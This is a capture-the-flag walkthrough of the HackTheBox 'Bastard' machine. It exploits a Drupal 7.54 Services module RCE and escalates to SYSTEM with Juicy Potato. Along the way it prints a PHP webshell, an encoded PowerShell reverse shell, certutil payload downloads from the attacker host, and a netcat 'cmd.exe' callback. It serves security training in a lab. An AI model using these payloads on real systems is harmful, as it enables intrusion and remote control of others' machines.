# Bastard

## Introduction

Welcome to my another writeup! In this HackTheBox [Bastard](https://app.hackthebox.com/machines/Bastard) machine, you'll learn: Exploiting Drupal 7.x Module Services RCE, privilege escalation via `SeImpersonatePrivilege`, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: NT AUTHORITY\IUSR to NT AUTHORITY\SYSTEM](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bastard/images/Bastard.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|15:22:03(HKT)]
└> export RHOSTS=10.10.10.9          
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|15:22:04(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN scanning/rustscan.txt
[...]
PORT      STATE SERVICE REASON  VERSION
80/tcp    open  http    syn-ack Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Microsoft-IIS/7.5
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
135/tcp   open  msrpc   syn-ack Microsoft Windows RPC
49154/tcp open  msrpc   syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**`nmap` UDP scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|15:22:34(HKT)]
└> sudo nmap -sU $RHOSTS -oN scanning/nmap-udp-top1000.txt 
[...]
Not shown: 1000 open|filtered udp ports (no-response)
```

According to `rustscan` and `nmap` result, we have 3 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|80/TCP            | Microsoft IIS httpd 7.5       |
|135/TCP, 49154/TCP| RPC                           |

### HTTP on TCP port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|15:23:17(HKT)]
└> echo "$RHOSTS bastard.htb" | sudo tee -a /etc/hosts
10.10.10.9 bastard.htb
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bastard/images/Pasted%20image%2020230728152407.png)

In here, we can see that **the web application is using [Drupal](https://www.drupal.org/)**, which is an open source CMS (Content Management System).

## Initial Foothold

**According to the `/robots.txt` in `nmap`'s scripting scan, there's a `/CHANGELOG.txt` disallow entry:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|15:34:55(HKT)]
└> curl http://bastard.htb/CHANGELOG.txt

Drupal 7.54, 2017-02-01
-----------------------
[...]
```

We can confirmed that the Drupal version on the web application is **7.54**.

**Hence, we can find public exploits for that version in `searchsploit`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|15:36:03(HKT)]
└> searchsploit drupal 7.x 
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Drupal 7.x Module Services - Remote Code Execution                   | php/webapps/41564.php
[...]
```

**Looks like version 7.x is vulnerable to Remote Code Execution (RCE). Let's mirror `41564.php`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|15:37:16(HKT)]
└> searchsploit -m 41564
  Exploit: Drupal 7.x Module Services - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/41564
     Path: /usr/share/exploitdb/exploits/php/webapps/41564.php
    Codes: N/A
 Verified: True
File Type: C++ source, ASCII text
Copied to: /home/siunam/ctf/htb/Machines/Bastard/41564.php
```

**41564.php:**
```php
[...]
# Drupal Services Module Remote Code Execution Exploit
# https://www.ambionics.io/blog/drupal-services-module-rce
# cf
#
# Three stages:
# 1. Use the SQL Injection to get the contents of the cache for current endpoint
#    along with admin credentials and hash
# 2. Alter the cache to allow us to write a file and do so
# 3. Restore the cache
#
[...]
```

By reading the exploit code, it's not malicious to us, and trying to exploit SQL injection vulnerability to upload a PHP webshell.

For more details about this vulnerability, you can read this blog post: [https://www.ambionics.io/blog/drupal-services-module-rce](https://www.ambionics.io/blog/drupal-services-module-rce)

In that blog post, it mentioned: "The exploitation is completely stealth. Nevertheless, one has to ***guess or find the endpoint URL***, which mitigates the vulnerability a bit."

**In the exploit code, it has variable `$endpoint_path`:**
```php
$endpoint_path = '/rest_endpoint';
```

**And when we go there, it responses "404 Not Found" HTTP status code:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|15:47:31(HKT)]
└> httpx http://bastard.htb/rest_endpoint
HTTP/1.1 404 Not Found
[...]
```

To find the endpoint, we need to find Drupal's **module "Service" endpoint**.

> [Services](https://www.drupal.org/project/services) is a _"standardized solution for building API's so that external clients can communicate with Drupal"_. Basically, it allows anybody to build SOAP, REST, or XMLRPC endpoints to send and fetch information in several output formats. It is currently the 150th most used plugin of Drupal, with around 45.000 active websites.
>   
> Services allows you to create different endpoints with different resources, allowing you to interact with your website and its content in an API-oriented way. For instance, you can enable the `/user/login` resource to login via JSON or XML. (From the previously mentioned blog post)

**To do so, we can use content discovery tools like `gobuster`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|15:58:06(HKT)]
└> gobuster dir -u http://bastard.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 40
[...]
/rest                 (Status: 200) [Size: 62]
```

**`/rest` looks promising:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|16:05:14(HKT)]
└> curl http://bastard.htb/rest            
Services Endpoint "rest_endpoint" has been setup successfully.
```

**Nice, we found the module "Service" endpoint, let's modify variable `$endpoint_path`'s value:**
```php
$endpoint_path = '/rest';
```

**Before running the exploit, we also need to modify the `$url` variable:**
```php
$url = 'http://bastard.htb';
```

Moreover, we need to upload a PHP webshell via modifying the `$file` variable.

**So, our final modified exploit code is:**
```php
$url = 'http://bastard.htb';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'webshell.php',
    'data' => '<?php system($_GET["cmd"]); ?>'
];
```

When the GET parameter `cmd` is provided in `webshell.php`, it'll execute system commands based on parameter `cmd`'s value.

**Let's run it!**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|16:10:50(HKT)]
└> php 41564.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://bastard.htb/webshell.php
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|16:12:53(HKT)]
└> curl http://bastard.htb/webshell.php --get --data-urlencode "cmd=whoami"
nt authority\iusr
```

Nice! We now can get a reverse shell!

> Note: If you encountered `curl_init()` error, install `php-curl`: `sudo apt-get install php-curl`.

- **Setup a netcat listener:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|16:13:38(HKT)]
└> rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
```

- **Send a reverse shell payload:** (Generated from [revshells.com](https://www.revshells.com/))

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|16:21:23(HKT)]
└> curl http://bastard.htb/webshell.php --get --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

- **Profit:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|16:13:38(HKT)]
└> rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.9] 62693

PS C:\inetpub\drupal-7.54> whoami; ipconfig /all
nt authority\iusr

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Bastard
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-7B-84
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.9(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
   NetBIOS over Tcpip. . . . . . . . : Enabled
[...]
```

I'm user `nt authority\iusr`!

**user.txt:**
```shell
PS C:\Users\dimitris\Desktop> type user.txt
{Redacted}
```

## Privilege Escalation

### NT AUTHORITY\IUSR to NT AUTHORITY\SYSTEM

**System information:**
```shell
PS C:\Users\dimitris\Desktop> systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
[...]
System Type:               x64-based PC
```

- Windows version: **Windows Server 2008 R2 Build 7600**

This version is quite old, maybe we can leverage Kernel Exploits (KE) to escalate our privilege to SYSTEM.

**`nt authority\iusr` user privilege:**
```shell
PS C:\Users\dimitris\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

As expected, since `nt authority\iusr` is a service account (`AppPool`), **it should have `SeImpersonatePrivilege`.**

Armed with above information, we can use "**Potato**" like exploit that abuses `SeImpersonatePrivilege` to escalate our service account's privilege to SYSTEM. 

Since the the Windows version is quite old (Windows Server 2008), we can use **"[Juicy Potato](https://github.com/ohpe/juicy-potato)"**. (Based on [https://jlajara.gitlab.io/Potatoes_Windows_Privesc#tldr](https://jlajara.gitlab.io/Potatoes_Windows_Privesc))

- **Transfer [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) to the target machine:** 

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|17:03:01(HKT)]
└> file /opt/juicy-potato/JuicyPotato.exe 
/opt/juicy-potato/JuicyPotato.exe: PE32+ executable (console) x86-64, for MS Windows, 7 sections
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|17:03:12(HKT)]
└> python3 -m http.server -d /opt/juicy-potato/ 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
PS C:\inetpub\drupal-7.54> certutil -urlcache -split -f http://10.10.14.15/JuicyPotato.exe
[...]
PS C:\inetpub\drupal-7.54> .\JuicyPotato.exe
JuicyPotato v0.1 

Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port
[...]
```

- **Setup a netcat listener:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|17:07:03(HKT)]
└> rlwrap -cAr nc -lvnp 53 
listening on [any] 53 ...
```

- **Verify the exploit is working or not:**

```shell
PS C:\inetpub\drupal-7.54> .\JuicyPotato.exe -l 1337 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 1337
....
[+] authresult 0
{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

It worked!

- **Transfer netcat executable (64-bit) to the target machine:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|17:29:30(HKT)]
└> file /opt/static-binaries/binaries/windows/x64/nc.exe
/opt/static-binaries/binaries/windows/x64/nc.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 7 sections
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|17:29:35(HKT)]
└> python3 -m http.server -d /opt/static-binaries/binaries/windows/x64/ 80     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
PS C:\inetpub\drupal-7.54> certutil -urlcache -split -f http://10.10.14.15/nc.exe
```

- **Run the "Juicy Potato" exploit with reverse shell payload with netcat:**

```shell
.\JuicyPotato.exe -l 1337 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a "/c C:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.15 53" -t *
```

- **Profit:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastard)-[2023.07.28|17:23:44(HKT)]
└> rlwrap -cAr nc -lvnp 53 
listening on [any] 53 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.9] 49655
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami && ipconfig /all
whoami && ipconfig /all
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Bastard
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-AF-84
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.9(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
   NetBIOS over Tcpip. . . . . . . . : Enabled
[...]
```

I'm `NT AUTHORITY\SYSTEM`! :D

## Rooted

**root.txt:**
```shell
C:\Users\Administrator\Desktop>type root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bastard/images/Pasted%20image%2020230728173418.png)

## Conclusion

What we've learned:

1. Content Discovery Via `gobuster`
2. Exploiting Drupal 7.x Module Services Remote Code Execution
3. Vertical Privilege Escalation Via Abusing `SeImpersonatePrivilege` Using Juicy Potato